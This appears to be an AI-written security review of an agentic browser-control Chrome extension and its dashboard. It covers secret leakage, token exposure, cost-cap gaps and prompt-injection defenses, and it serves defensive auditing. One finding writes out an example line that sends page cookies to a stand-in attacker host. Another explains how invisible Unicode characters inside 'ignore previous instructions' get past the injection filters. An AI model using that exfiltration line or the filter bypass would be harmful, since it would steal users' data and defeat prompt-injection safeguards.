# Full Codebase Review – Open Cowork (Agentic Browser Control Chrome Extension)

**Date:** 2026-07-10
**Reviewer:** AI Thermonuclear Auditor (5-agent parallel orchestration + independent principal verification)
**Scope:** Entire local codebase (330 source files across `src/`, `cockpit/`, `mini-services/`, `tests/`, configs, docs)
**Method:** Recon → 5 parallel read-only specialized review agents (Extension, Agent Core, LLM/Security, Cockpit, Cross-cutting) → independent principal verification of the highest-risk surfaces (auth, secrets, prompt-injection, cockpit proxy, mini-service) → normalization.

---

## 1. Executive Summary

- **Overall Health Score:** **7 / 10** — A genuinely well-engineered, security-conscious codebase. The trust-boundary defenses (constant-time token compare, 127.0.0.1 binding, fail-closed cockpit auth, NFKC + zero-width prompt-injection defense, `%var%` secret substitution, shadow-DOM piercing, CDP `try/finally` detach) are correctly implemented and verified. It loses points for (a) two High-severity issues that break core guarantees in the *default* configuration, (b) an auth-token model that collapses if the cockpit is ever served beyond loopback, and (c) CI/observability blind spots that give false assurance.

- **Top 3 Critical Risks:**
  1. **Secret isolation is defeated for non-password fields (F-01, High).** `%var%` secrets typed into `type="text"`/`email`/2FA fields are read back into the LLM context on the next step because `wrapUntrusted` runs injection-redaction but **not** `redactSecrets`. The core "secrets never reach the LLM" guarantee does not hold.
  2. **Cost-cap bypass for uncatalogued models (F-02, High).** `getPricingForModel` returns `$0` for any model absent from the hardcoded table, and the documented models.dev catalog override is never wired in — so several *default* models (groq, together, cerebras) report $0 and the cost cap never trips (unbounded spend).
  3. **Shared `COWORK_EVENT_TOKEN` is embedded in the browser bundle (F-03, Medium→High if deployed beyond localhost) + unconstrained `chat:join` room-scoping (F-04).** The single secret that gates every API and the mini-service is shipped via `NEXT_PUBLIC_`. If the cockpit is ever reachable by untrusted users, the entire auth model collapses and any client can read another session's streamed tokens.

- **Top 3 High-Impact, Low-Effort Wins:**
  1. **Run `redactSecrets` over `browserState.elementsText`/`axTree` before it enters the prompt** (inside `wrapUntrusted` or `buildNavigatorUserMessage`). One call site fixes F-01.
  2. **Fix the CI `chrome-extension/` sync-check** (F-29) — either track the built `.js`/`chunks/` or replace the diff with a provenance assertion; today it only compares committed static text files and gives false assurance.
  3. **Stop leaking raw errors and swallowing malformed bodies** (F-04-adjacent: `withRouteError` returns `e.message` to clients (F-04a); `bodyJson` returns `{}` on parse failure (F-04b)). Both are one-function fixes that remove a real info-leak and a validation gap.

---

## 2. Recon & Baseline

- **Stack:** TypeScript 5 (strict), MV3 Chrome extension bundled with esbuild (ESM+splitting for the SW, IIFE for content/sidepanel/options); Next.js 16 cockpit (React, Prisma/SQLite, socket.io client); standalone socket.io + z-ai-web-dev-sdk mini-service on `127.0.0.1:3003`; Vitest + jsdom test suite (589 `test()` calls across 23 files).
- **Three deployable surfaces:**
  - **Extension** (`src/extension/` → `chrome-extension/`): service worker, content script, side panel, options. Calls LLM providers directly via `fetch` (no backend). Permissions: `debugger`, `downloads`, `notifications`, `scripting`, `tabs`, `activeTab`, `storage`, `alarms`, `unlimitedStorage`, `power`. `host_permissions: http://*/* + https://*/*`. No `externally_connectable`, no `web_accessible_resources`.
  - **Cockpit** (`cockpit/`): read-mostly Next.js dashboard over Prisma/SQLite. Auth via `X-Cowork-Token` middleware (constant-time, fail-closed in prod), 5 public discovery routes.
  - **Mini-service** (`mini-services/cowork-events/`): socket.io + REST, bound to loopback, shared-secret auth, proxy to z-ai LLM.
- **Trust boundaries:** page content (untrusted) → sanitization (`security.ts`) → LLM; user secrets (`chrome.storage.session`) → `%var%` substitution → actions; cockpit ↔ mini-service (server-to-server, fixed `localhost:3003`); browser ↔ cockpit (shared secret in bundle — see F-03).
- **Repo shape:** agentic/AI-heavy. Review weighted toward security (prompt injection, tool/sandbox safety, secret handling), agent-loop correctness, and the cross-package auth/CI model.

---

## 3. Code Review Findings

### F-18 — `done` combined with other actions silently drops the preceding actions
- **Severity:** Low · **Confidence:** high · **Dimension:** Code Review
- **Location:** `src/lib/agent/loop/orchestrator.ts:453-463`; `tools/schema.ts:369-375`, `schema.ts:421`
- **Evidence:** `const doneAction = actions.find((a) => a.type === "done");` routes to `handleNavigatorDone` immediately, discarding any sibling actions (e.g. a final `input`). `DoneSchema` does not enforce `done`-exclusivity; `ACTION_METADATA.done.exclusive = true` is never checked at parse time.
- **Why it matters:** On weaker/local models that batch a final field-fill with `done`, the fill is lost and the run finalizes as if it ran.
- **Recommended fix:** Enforce exclusivity in the schema (if any action is `done`, array length must be 1), or execute pre-`done` actions before entering `handleNavigatorDone`.

### F-19 — Loop-detector defeated for page-changing actions; `evaluate` falsely reports `pageChanged`
- **Severity:** Low · **Confidence:** high · **Dimension:** Code Review / Concurrency
- **Location:** `src/lib/agent/loop/helpers/action-queue.ts:151-154`; `tools/handlers/evaluate.ts:68-74`
- **Evidence:** Each action is `loopDetector.record()`-ed then `loopDetector.reset()` clears the window on `result.pageChanged`. Actions that always report `pageChanged` (navigate/search/go_back/`evaluate`) can never accumulate repetitions, so `shouldWarn()` never fires for them. `handleEvaluate` returns `pageChanged: true` unconditionally even for read-only `return document.title`.
- **Why it matters:** An agent stuck re-running `evaluate`/`navigate`/`go_back` won't trip the repetition detector; the unconditional `pageChanged` also forces a full DOM re-extract every step (perf).
- **Recommended fix:** Set `evaluate`'s `pageChanged` only when URL/fingerprint actually changed (executor already captures `ctx.beforeUrl`/`beforeFingerprint`); consider recording (not resetting) the detector on semantically-identical stuck moves.

### F-20 — OpenAI-format structured output drops the JSON schema
- **Severity:** Medium · **Confidence:** high · **Dimension:** Code Review / Data Validation / AI-Safety
- **Location:** `src/lib/agent/llm/protocols/openai-chat.ts:88`; `providers/openai.ts:64` (also azure/xai/openrouter and compatible profiles)
- **Evidence:** `if (request.schema) body.response_format = { type: "json_object" };` — the schema is discarded; only `json_object` is sent. Yet every facade advertises `supportsStructuredOutput: true`, so the in-prompt schema fallback (`llm-direct.ts:177-178`) does not fire. Anthropic (`anthropic-messages.ts:72-85`) and Gemini (`gemini.ts:56-68`) correctly serialize via `z.toJSONSchema`.
- **Why it matters:** Output reliability on OpenAI/Azure/xAI/OpenRouter degrades to "valid JSON, unknown shape," increasing parse-retry churn and cost. The advertised native structured output is not honored.
- **Recommended fix:** Send `response_format: { type: "json_schema", json_schema: { name, schema: toJSONSchema(request.schema), strict: true } }` for capable providers, or set `supportsStructuredOutput: false` so the in-prompt fallback engages.

### F-21 — Static pricing table has stale/incorrect rates
- **Severity:** Medium · **Confidence:** medium · **Dimension:** Code Review (pricing accuracy)
- **Location:** `src/lib/agent/llm/pricing.ts:45-49, 59`
- **Evidence:** `"gemini-2.5-pro": { in: 1.25, out: 5 }` under-reports output (~$10/M). `"o3": { in: 15, out: 60 }` over-reports (~7× vs repriced ~$2/$8). Header claims "early 2025"; several entries have since moved.
- **Why it matters:** Cost accounting and cost-cap enforcement are inaccurate (both directions); no self-correcting path.
- **Recommended fix:** Source rates from the live models.dev catalog at runtime; keep the static table only as offline fallback and date-stamp entries. (Pairs with F-02.)

### F-23 — Model IDs interpolated into request URLs without encoding
- **Severity:** Low · **Confidence:** high · **Dimension:** Data Validation / Injection
- **Location:** `protocols/gemini.ts:146-148`; `providers/azure.ts:59`
- **Evidence:** `geminiPath` returns `/${model}${PATH}`; Azure builds `/openai/deployments/${modelID}/chat/completions` — no `encodeURIComponent`. Model ids are user/catalog-sourced, not page-derived.
- **Why it matters:** Malformed/crafted ids can alter the path/query (defensive only — not remotely exploitable).
- **Recommended fix:** `encodeURIComponent(modelID)`; optionally validate against `[\w.:-]+`.

---

## 4. Audit Findings

### F-03 — Shared `COWORK_EVENT_TOKEN` embedded in the browser bundle (auth-boundary collapse if exposed)
- **Severity:** Medium · **Confidence:** high · **Dimension:** Audit / Security / Configuration
- **Location:** `cockpit/src/hooks/use-cowork-query.ts:39`, `cockpit/src/hooks/use-websocket.ts:16-17`, `cockpit/.env.example:11-12`
- **Evidence:** The same secret that gates every `/api/cowork/*` route, the mini-service `/emit`/`/chat`/`/image`/`/events`, and socket.io handshakes is exposed as a `NEXT_PUBLIC_` env var, embedded in the client bundle, and sent on every `fetch` + handshake. `.env.example` comment: "MUST match COWORK_EVENT_TOKEN … Prefix with NEXT_PUBLIC_ so Next.js exposes it to client-side code."
- **Why it matters:** The cockpit REST API is authenticated only by this single shared secret. Anyone who can load the page can extract it from the JS bundle and replay it against all protected routes. Any XSS in the cockpit yields full token compromise (cascading to the mini-service, including F-04). Risk is Low on trusted localhost/intranet, **High if the cockpit is ever served to untrusted users**. SECURITY.md never mentions this exposure.
- **Recommended fix:** Mint a short-lived, per-session token server-side for the dashboard↔mini-service socket and keep `COWORK_EVENT_TOKEN` strictly server-side. At minimum, document prominently in SECURITY.md that the cockpit must never be deployed beyond localhost while using `NEXT_PUBLIC_COWORK_EVENT_TOKEN`.

### F-04 — `chat:join` accepts any `sessionId` from any authenticated client (room-scoping defeated)
- **Severity:** Medium · **Confidence:** high · **Dimension:** Audit / Security
- **Location:** `mini-services/cowork-events/index.ts:662-687`
- **Evidence:** `socket.on('chat:join', (sessionId) => { if (typeof sessionId === 'string' && sessionId) socket.join(sessionId); })` — accepts any string. The code explicitly documents the limitation (lines 665-682). The HTTP `/chat` route scopes `io.to(sessionId)`, but unconstrained room membership voids that scoping. Combined with F-03, any cockpit client can subscribe to another session's streamed tokens.
- **Why it matters:** In any multi-user/multi-tab deployment, chat streaming is not scoped to the owner. Acceptable only for the single-trusted-operator-on-loopback model.
- **Recommended fix:** Bind room membership to a per-connection `socket.data.clientId` set at handshake and validate ownership before `socket.join` (per the in-code TODO); implement the per-session HMAC described there.

### F-05 — Dev-token refusal gated only on exact `NODE_ENV==='production'`
- **Severity:** Medium · **Confidence:** high · **Dimension:** Audit / Security / Configuration
- **Location:** `mini-services/cowork-events/security.ts:112`; `cockpit/src/middleware.ts:73`; `cockpit/.env.example:7-9`
- **Evidence:** `shouldRefuseStart` returns `nodeEnv === 'production' && sharedSecret === DEV_TOKEN`. The mini-service is launched via `npx tsx index.ts`, which does **not** set `NODE_ENV` automatically. `cockpit/.env.example` ships `COWORK_EVENT_TOKEN=dev-token`. Neither the mini-service README nor any `.env.example` instructs operators to set `NODE_ENV=production` for the mini-service. `tests/cowork-events.test.ts:157-169` even proves "allows when NODE_ENV is unset (no production safety net)."
- **Why it matters:** The only thing preventing the well-known `dev-token` from being accepted in production is an exact, case-sensitive `NODE_ENV` string. A misconfigured deploy (unset / `'prod'` / container manager not setting it) runs with the public `dev-token` and accepts unauthenticated connections to the event bus + AI proxy (intended to sit behind Caddy/loopback).
- **Recommended fix:** Refuse `dev-token` by default unless an explicit dev opt-in is set (e.g. require `COWORK_ALLOW_DEV_TOKEN=1`); or invert the logic. Document `NODE_ENV=production` as mandatory in the mini-service README.

### F-07 — `getDomainConfig` fails open (allow/blocklist silently bypassed when global absent)
- **Severity:** Low · **Confidence:** medium · **Dimension:** Audit / Security
- **Location:** `src/lib/agent/tools/helpers/domain-config.ts:21-31`; `src/extension/content.ts:165-167`; `security.ts:448-469`
- **Evidence:** `getDomainConfig()` returns `{}` on any error or when `__openCoworkDomainConfig` is unset; `checkUrlAllowed({})` returns `{allowed:true}` (empty config = allow-all). `content.ts` sets the global to `(msg).domainConfig`, which is `undefined` if the SW omits it.
- **Why it matters:** The default (no allowlist = allow all) is intentional, but if a user *configured* a list and the message ever lacks `domainConfig` (re-injected content script, message-shape drift), the policy is silently bypassed fail-open rather than fail-closed.
- **Recommended fix:** Distinguish "no policy configured" from "policy unavailable"; fail closed (block) on a missing/undefined config when enforcement is expected.

### F-08 — `evaluate` runs LLM/user-authored JS via `new Function` in the page context (not sandboxed)
- **Severity:** Low · **Confidence:** high · **Dimension:** Audit / AI-Safety / Security
- **Location:** `src/lib/agent/tools/handlers/evaluate.ts:35-53`; `src/extension/options/custom-tools.ts:73-112`
- **Evidence:** `const fn = new Function(code); fn();` runs LLM-authored JS in the content-script's isolated world with full `document`/DOM access. The `domain` gate constrains *where* code runs, not *what* it can reach (e.g. `fetch("https://attacker/?d="+document.cookie)` egresses under the extension's host permissions). Default policy allow-all when no allowlist set; synchronous infinite loops can't be interrupted (only async Promises race the timeout).
- **Why it matters:** Combined with page-driven prompt injection, this is a data-exfil vector. **Substantially mitigated:** `evaluate` requires `canExecuteJs` (true only in `full_agentic`); in `standard` mode it is `confirmRequired`. Documented as Info/Medium; the residual egress gap is worth documenting.
- **Recommended fix:** Treat `evaluate` as high-risk (default `requiresConfirmation`); consider a Web Worker sandbox or capability allowlist; enforce a strict default domain allowlist; document the trust model in SECURITY.md.

### F-15 — Constant-time token compare early-exits on length mismatch
- **Severity:** Low · **Confidence:** medium · **Dimension:** Audit / Security
- **Location:** `mini-services/cowork-events/security.ts:47-48`; `cockpit/src/middleware.ts:54-58`
- **Evidence:** Both return `false` immediately when `received.length !== expected.length`, before the constant-time loop. Comments claim "the expected token's length is not a secret."
- **Why it matters:** An attacker who can measure response timing precisely could learn the expected token's length. Low risk given loopback binding, but the "constant-time" claim in SECURITY.md/`security.test.ts` is slightly overstated.
- **Recommended fix:** Pad/normalize before comparison or document that length is not treated as secret. Low priority given loopback exposure.

### F-17 — `validateHttpUrl` permits internal/private hosts (stored only today)
- **Severity:** Info · **Confidence:** high · **Dimension:** Audit / Security (SSRF)
- **Location:** `cockpit/src/lib/cowork/api/http.ts:41-51`; callers `tabs/route.ts:45`, `bookmarks/route.ts:77`
- **Evidence:** Validation rejects only non-`http`/`https` schemes; accepts `http://169.254.169.254/...`, `http://localhost`, `http://10.x`. These URLs are only **stored** (the cockpit never fetches them server-side), so this is not server-side SSRF today.
- **Why it matters:** If any future feature drives a real browser to these stored URLs, internal/metadata endpoints become reachable.
- **Recommended fix:** If URLs are ever fetched/launched, add SSRF guards (block link-local/RFC1918/localhost) at that point. (`safeHref` in `format.ts:44-53` already blocks `javascript:`/`data:` rendering — good defense-in-depth.)

---

## 5. Refactoring Opportunities

- **F-26 — Re-export shims are live indirection, not dead code (Info).** `src/lib/agent/dom/extractor.ts`, `dom/overlay.ts`, `dom/screenshot-annotator.ts`, `dom/shadow-piercer.ts`, `dom/popup-handler.ts` are documented `export * from "./annotation/..."`/`"./extraction/..."` shims, still imported by ~4 internal callers and carrying load-time side effects (`installShadowPiercer`). Two import paths for the same symbols is a maintenance trap. *Recommend:* track a deprecation to migrate internal importers to canonical paths and delete the shims; add a lint rule forbidding new shim-path imports. (Not a bug.)
- **F-27 — Duplicated goal-loop threshold constant vs literal (Info).** `loop-detector.ts:217` defines `GOAL_WARN_THRESHOLD = 3`, but `phases/planner-phases.ts:239` hard-codes `if (goalCount >= 3)`. *Recommend:* expose/use the constant so tuning propagates.
- **F-25 — Dead exports (Low).** `streamChat` (`provider-bridge.ts:94-141`, no caller), `getSecret` (`secrets.ts:123-126`, no `src` caller), and `flagInjections` (`security.ts:371-376`). `flagInjections` embeds the *raw* (unsanitized) text inside `<untrusted_injection_warning>` (security.ts:375), which would re-introduce content the label-only design elsewhere avoids — a latent footgun. *Recommend:* delete `flagInjections` and `getSecret`; delete or add a consumer for `streamChat`.
- **Provider facade duplication (Low, noted by Agent 3):** the `auth()` helper is near-identically copied across the 7 dedicated facades (`openai`/`anthropic`/`google`/`xai`/`openrouter`/`azure`). *Recommend:* extract a shared `makeBearerAuth()` helper.

---

## 6. Dead Code Scan

- **Intentional shims (NOT dead):** the `dom/` vs `dom/annotation/` vs `dom/navigation/` re-export shims are verified legacy-compat shims (see F-26) — do not delete without migrating callers.
- **F-25 dead exports** (`streamChat`, `getSecret`, `flagInjections`) — see §5.
- **No orphaned configs/scripts** among `eslint.config.mjs`, `tsconfig.json`, `vitest.config.ts`, `esbuild.config.ts`; paths they reference exist.
- **N/A – no other dead code of consequence found.**

---

## 7. Architecture & Design

- **Strengths:** The `route/` (auth/endpoint/transport/framing) + `protocols/` + `providers/` + `provider-bridge` layering is clean and genuinely deduplicates the 14 providers via `openai-compatible-profile`. The agent-loop separation (orchestrator ↔ tools ↔ dom) is coherent.
- **F-28 — MCP tool catalog advertises unimplemented dangerous capabilities (Low).** `cockpit/src/app/api/cowork/mcp/tools/route.ts:32-312` is a static ~300-tool list describing browser-driving/destructive/credential ops (`auth_login`, `clipboard_read`, `data_export_cookies`, `history_clear`, …) the cockpit does **not** implement. The public `agent/manifest` route advertises `/mcp/tools` as real. *Why it matters:* an LLM consuming the manifest believes it can call these (404 today, but "phantom capabilities" revealed with no extra auth if a backend is later wired). *Fix:* label the catalog "aspirational / not served," or trim to implemented capabilities.
- **F-42 — `events/stream` SSE requires a header `EventSource` cannot send (Low).** `cockpit/src/app/api/cowork/events/stream/route.ts:33` is gated by the middleware's `X-Cowork-Token`; browser `EventSource` cannot send custom headers, so it always 401s from a browser. The token gate still applies (no security hole), but the documented "external SSE consumers" use-case is non-functional. *Fix:* authenticate server-to-server SSE via signed query token/cookie, or document it as server-only.
- **F-03/F-04 (auth architecture)** — see §4. The single-shared-secret model with a browser-visible copy is an architectural trust-boundary weakness.

---

## 8. Security Audit

> Dependency CVEs: **none could be verified offline** (no network/lockfile audit in this read-only pass). Loose caret ranges (`zod: ^4.4.3`, `next: ^16.1.1`, `socket.io: ^4.7.2`, `esbuild: ^0.28.1`) plus the absence of `npm audit` in CI (F-31) mean vulnerabilities can land silently. **Recommend** running `npm audit` per sub-package and adding it to CI.

### Secret handling
- **F-01 (HIGH) — `%secret%` values leak back to the LLM via DOM value re-extraction on non-sensitive fields.**
  - **Confidence:** high · **Location:** `src/lib/agent/dom/extraction/element-info.ts:108`; `dom/utils/classification.ts:271-276`; `loop/messages.ts:188`; `secrets.ts:169` (`redactSecrets` applied *only* to on-disk run history).
  - **Evidence:** Stated invariant: "the actual values never cross the network to the LLM provider" (`secrets.ts:5-6`). `substituteSecrets` types the real value into the DOM at `input.ts:27`. On the next step, DOM extraction reads `el.value` for any element where `!isSensitive(el)` (`element-info.ts:108`). `isSensitive` is true only for `type="password"`, `type="hidden"`, and the `SENSITIVE_AUTOCOMPLETE` list (`classification.ts:260-276`). A secret typed into a plain `type="text"`/`email`/2FA field therefore enters `browserState.elementsText`, which reaches the LLM via `wrapUntrusted(browserState.elementsText)` at `messages.ts:188`. `wrapUntrusted` runs `sanitizeUntrusted` (injection redaction) only — **not** `redactSecrets`.
  - **Why it matters:** The core secret-isolation guarantee is defeated for any credential typed into a non-password field (emails, usernames, coupon/2FA/security-answer). Once in the model context, a page-content prompt injection (the exact threat `security.ts` defends against) can exfiltrate it.
  - **Recommended fix:** Run `redactSecrets` over `browserState.elementsText`/`axTree`/history-extracted content before it enters the prompt (inside `wrapUntrusted` or `buildNavigatorUserMessage`), OR broaden `isSensitive` to redact any field whose current value equals a stored secret. The former is more robust.

- **F-11 (LOW) — Provider error text (may contain API key) surfaced to UI.** `provider-config-ui.ts:130-132` renders `e.message.slice(0,100)` verbatim; provider 401/403 bodies occasionally embed the key. *Fix:* redact common key prefixes (`sk-`, `sk-ant-`, `AIza`, `gsk_`, `xoxb-`) before display; avoid embedding secrets in cache keys (`llm-direct.ts:90`).
- **F-12 (LOW) — Completion webhook URL not scheme-validated; exfiltrates task text.** `background/task-queue.ts:101-133` POSTs `webhookUrl` with task text (may contain prompts/secrets) and only rejects `javascript:`/`data:` in practice; `http(s)` to any host is allowed (SSRF-style exfil from privileged origin). *Fix:* validate `https:` (or at least `http(s)`) absolute URL before POSTing.
- **F-13 (LOW) — `getCockpitUrl()` storage-controlled URL opened with no scheme check.** `shared.ts:53-62` → `sidepanel/index.ts:125` `chrome.tabs.create({ url: cockpitUrl })`; no scheme validation. *Fix:* allow only `http:`/`https:` (ideally the expected Cockpit host).

### Prompt-injection defense (otherwise strong)
- **F-06 (MEDIUM) — Redaction/flagging bypassable via non-stripped invisible/format Unicode chars.** `security.ts:151-155` (`normalize`) strips a fixed set (`​-‍‎‏⁠-⁤﻿­᠎`) after NFKC; this is not exhaustive of `Default_Ignorable_Code_Point`/`\p{Cf}`. E.g. U+3164 (Hangul Filler) NFKC-maps to U+1160 (invisible, not stripped); U+061C, U+2028/2029 survive. Injecting such a char inside a keyword (`igㅤnore previous instructions`) defeats both the destructive (`sanitizeUntrusted`) and non-destructive (`scanForInjection`) layers (whose `ZERO_WIDTH_CHARS` at line 274 only tests U+200B-D/FEFF). *Why it matters:* removes two of the layered mitigations the module advertises (content is still wrapped + `SECURITY_INSTRUCTION`, so not a full compromise). *Fix:* strip the full `\p{Cf}`/`\p{Default_Ignorable_Code_Point}` set in `normalize` and widen `ZERO_WIDTH_CHARS` to match.
- **F-09 (LOW) — `find_elements` returns raw attribute values with no sensitive-field redaction.** `tools/handlers/find-elements.ts:81-88` returns any requested attribute via `getAttribute`, bypassing the extractor's `isSensitive`/`[value redacted]` policy (`page-state.ts:365-366`, `element-info.ts buildAttrs`). *Fix:* route `find_elements` attribute extraction through the same redaction helper, or block `value` extraction on password/OTP/cc inputs.
- **F-24 (LOW) — Broad injection flagging scan omits AX tree + history extracted content.** `loop/messages.ts:120-124` runs `scanForInjection` only on `elementsText + title + url + tabsBlock`; the `<accessibility_tree>` block (messages.ts:190-194) and per-history `extractedContent` (messages.ts:287) get the REDACT layer but not the wider FLAG layer. *Fix:* include `axTree` (and optionally recent `extractedContent`) in `injectionScanText`.

### XSS / message passing
- **F-10 (LOW) — `escapeHtml` does not escape `/` (latent footgun).** `shared.ts:24-36` escapes `& < > " '` only; a `/` in a `javascript:` URI/attribute context would not be stopped. Grep confirms no `escapeHtml(...)` output is currently interpolated into `href`/`src`/URI (so not exploitable today). *Fix:* escape `/` (`&#47;`) or forbid untrusted interpolation into URI/attribute contexts; never place `escapeHtml(...)` into `href`/`src`.
- **F-14 (LOW) — `appendThinkingEntry` trusts callers to pre-escape `body` (latent DOM-XSS).** `sidepanel/lifecycle.ts:95-97` does `entry.innerHTML = ...${body}...` with no escaping; current callers escape, but any future unescaped LLM/page string would XSS the side panel. *Fix:* escape `body` inside the function.
- **Verified CLEAN (sender validation):** every `chrome.runtime.onMessage`/`onConnect` handler validates `sender.id === chrome.runtime.id` (`background/message-routing.ts:114`, `content.ts:94`, `sidepanel/log-renderer.ts:324`, `sidepanel/human-interact.ts:23`); no `externally_connectable`; `innerHTML` sinks escape dynamic data. CSP: no `content_security_policy` declared (MV3 default applies), no inline scripts, no `web_accessible_resources`.

---

## 9. Performance Review

- **F-19 (perf aspect) — `evaluate` unconditional `pageChanged` forces a full DOM re-extract + baseline reset every step** even for read-only scripts. *Fix:* set `pageChanged` only on actual URL/fingerprint change.
- **F-21/F-02 (cost aspect)** — inaccurate/stale pricing and $0 for uncatalogued models distort cost accounting (see §3/§11).
- **Strengths (verified):** appropriate caches with `onChanged` invalidation; compaction estimates history size to avoid O(N²) `JSON.stringify` per step (`orchestrator.ts:612-618`); DOM walker skips `getComputedStyle` for non-interactive nodes; fingerprint capped at 500 elements; vision-assistant correctly code-split (not eagerly parsed); screenshot quality cached + invalidated on storage change; log/thinking rows capped. The paired-tag redaction regex is worst-case O(n²) on very large `elementsText` with many unclosed tags — bounded, not catastrophic.
- **F-36 (LOW) — Memory routes return all rows, no pagination** (`memory/site`, `memory/form` — see §11/§20). Unbounded payload + client-side filtering.

---

## 10. Maintainability & Code Quality

- **F-27 (Info)** duplicated constant vs literal — see §5.
- **F-26 (Info)** shim indirection — see §5.
- **F-25 (Low)** dead exports — see §5.
- **F-08 (Low)** `evaluate` (`new Function`) is a high-complexity, high-risk surface; consider isolating it behind a clearly-gated, well-documented path.
- **Verified mostly clean:** strict TS, ESLint config deliberately fixed to actually lint `.ts` (per `eslint.config.mjs` header); files are reasonably sized; no `any`-abuse of note in reviewed surfaces.

---

## 11. Data Validation

- **F-01 (HIGH)** secret re-extraction — secret *output* validation gap (see §8).
- **F-02 (HIGH)** cost-cap bypass from pricing-table miss — see §12/§3.
- **F-20 (MEDIUM)** OpenAI structured-output drops schema — see §3.
- **F-09 (LOW)** `find_elements` no sensitive-field redaction — see §8.
- **F-23 (LOW)** unencoded model IDs in URLs — see §3.
- **F-04b (MEDIUM) — `bodyJson()` swallows malformed JSON.** `cockpit/src/lib/cowork/api/http.ts:5-14` returns `{}` on parse failure. For `POST /workspaces`, `/sessions`, `/workflows`, `/bookmarks`, `/pinboards`, `/extensions/log`, a malformed/empty body silently creates a row with defaults (201) instead of 400 (`tabs/route.ts` correctly returns `badRequest('url is required')` because a required field is genuinely absent). *Why it matters:* malformed requests are indistinguishable from empty valid ones; masks client bugs; enables junk/duplicate-row spam (no rate limit). *Fix:* make `bodyJson` throw on parse failure (or return a sentinel) so callers 400; add per-route required-field checks.
- **Strengths:** `validateHttpUrl` blocks `javascript:`/`data:` stored-XSS in `tabs` POST; Zod schemas are appropriately tolerant (`flexibleBoolean` avoids `Boolean("false")` trap; `search_page` has regex-length + node-visit DoS caps); `output-parser` balanced-brace extraction is sound; options numeric inputs validated (`settings-sync.ts`, `scheduled-tasks.ts`); run-history import validates entry shape.

---

## 12. Error Handling & Resilience

- **F-04a (MEDIUM) — `withRouteError` returns raw `e.message` to clients.** `cockpit/src/lib/cowork/api/http.ts:59-78` serializes `e.message` verbatim. Prisma errors include table/column/constraint names; filesystem/parse errors can include absolute paths. *Why it matters:* any authenticated caller (and the public discovery routes wrapped in `withRouteError`) can extract internal schema details, aiding exploitation. *Fix:* log full error server-side (already done) and return a generic message keyed by a correlation id; withhold `e.message` unless it is a known safe validation string.
- **F-22 (LOW) — Retry classifier substring-matches status in response body; Retry-After date unsupported.** `llm/retry.ts:80-82` classifies on `msg.includes("429")` and `/\b5\d\d\b/.test(msg)` against the whole error string (up to 300 chars of provider body). A non-retryable 4xx whose body contains `500`/`429` is wrongly retried (4 attempts, extra spend). `Retry-After` parsed as `parseFloat(...) * 1000` (transport-http.ts:178); the HTTP-date form yields `NaN` and is silently ignored. *Fix:* carry the numeric HTTP status on the Error object and classify on that; support both integer-seconds and HTTP-date `Retry-After`.
- **Verified clean:** `runAgentLoop` never throws (`orchestrator.ts:69-85`); every handler dispatch wrapped (`executor.ts:133-139`); `judgeTask` fails to `null` without crashing (`judge.ts:170-238`); budget-exceeded deliberately propagates to finalize as failure; CDP detach `try/catch` no-op (`cdp-controller.ts:93-99`); SW-startup IIFE wrapped (`background/index.ts:122-155`); `cleanupRun` per-step try/catch (`run-helpers.ts:813-925`); content-script dialog watchdog bounded queue.

---

## 13. Feature Gate & Configuration Leak

- **N/A – no findings.** No debug-only behavior shipped in production beyond the user-gated `SET_DEBUG_HIGHLIGHT` overlay (`sidepanel/index.ts:141-148`, `content.ts:225-230`), which is opt-in via a checkbox. No stale feature flags or leaked config found.

---

## 14. Configuration & Secrets

- **F-03** shared token in browser — see §4/§8.
- **F-05** dev-token refusal fragility — see §4.
- **F-41 (LOW) — Mini-service lacks `.env.example` / env docs.** `find . -name ".env.example"` returns only `cockpit/.env.example`. The mini-service README documents install/run but not required env vars (`COWORK_EVENT_TOKEN`, `COWORK_CORS_ORIGIN`, `NODE_ENV`); an operator running it standalone has no template telling them to set a real token + `NODE_ENV=production` (compounds F-05). *Fix:* add `mini-services/cowork-events/.env.example` or document env vars in its README.
- **F-34 (LOW) — `--ignore-scripts` on cockpit install breaks local `db:generate`/runtime.** `package.json:18` postinstall: `npm --prefix cockpit install --ignore-scripts`. Suppresses Prisma's engine download; `npm install` at root → `db:generate`/runtime may fail locally (works in CI only, which uses `npm ci`). *Fix:* remove `--ignore-scripts` for cockpit or add an explicit `prisma generate` + engine-fetch step in `dev:cockpit`/`build:cockpit`; document the requirement.
- **Verified:** `DATABASE_URL` via `env()`; no secrets committed; mini-service `SHARED_SECRET = process.env.COWORK_EVENT_TOKEN || DEV_TOKEN` (fail-closed in prod via `shouldRefuseStart`); cockpit `dev-token` logged only as literal `'unset'`/`'dev-token'` (no real secret).

---

## 15. Documentation & Comments

- **F-40 (LOW) — AGENTS.md test-count claims are stale.** Claims "574 tests across 22 files" (`AGENTS.md:152,206`); actual: **589 `test()` calls across 23 files**. Documentation drift reduces trust in other stated counts. *Fix:* update to current counts (or generate from a script).
- **F-05/F-41** — missing operator directives (NODE_ENV, mini-service env) in docs.
- **F-03** — SECURITY.md does not mention the browser-visible `NEXT_PUBLIC_` token exposure.
- **Strengths:** README, AGENTS.md, SECURITY.md, CONTRIBUTING.md are detailed and largely accurate (architecture, security model, build commands match the code). Docs correctly describe the removed Password Vault (see §20).

---

## 16. Test Coverage & Quality

- **F-30 (MEDIUM) — Cockpit has zero automated tests; CI runs none.** `cockpit/package.json` has no `test` script; no `*.test.ts` in `cockpit/`; the root `vitest.config.ts` includes only `tests/**`. The CI `cockpit` job runs typecheck/lint/build but never tests. The cockpit contains the security middleware, proxy routes, and Prisma layer — all untested. *Fix:* add a test runner + `test` step; at minimum unit-test `middleware.ts` (token enforcement, fail-closed prod, public-discovery bypass) and proxy routes.
- **F-33 (LOW) — Mini-service `/chat` & `/image` success + socket.io broadcast untested.** `tests/cowork-events.test.ts:384-389` notes socket.io broadcast is "not tested here"; `/chat` only exercised for 413/429; the z-ai SDK streaming success path and `/image` success are never run (SDK not mocked); the documented `chat:join` limitation has no negative test. *Fix:* add `socket.io-client` (or mock `io`) and cover `/chat` success streaming, `/image` success, `events:replay`, and a negative test asserting an unauthenticated/hostile socket cannot read another session's `chat:message`.
- **F-29 (MEDIUM) — CI sync-check blind to compiled extension bundles** — see §22.
- **F-31 (MEDIUM) — No dependency/security scanning in CI** — see §19.
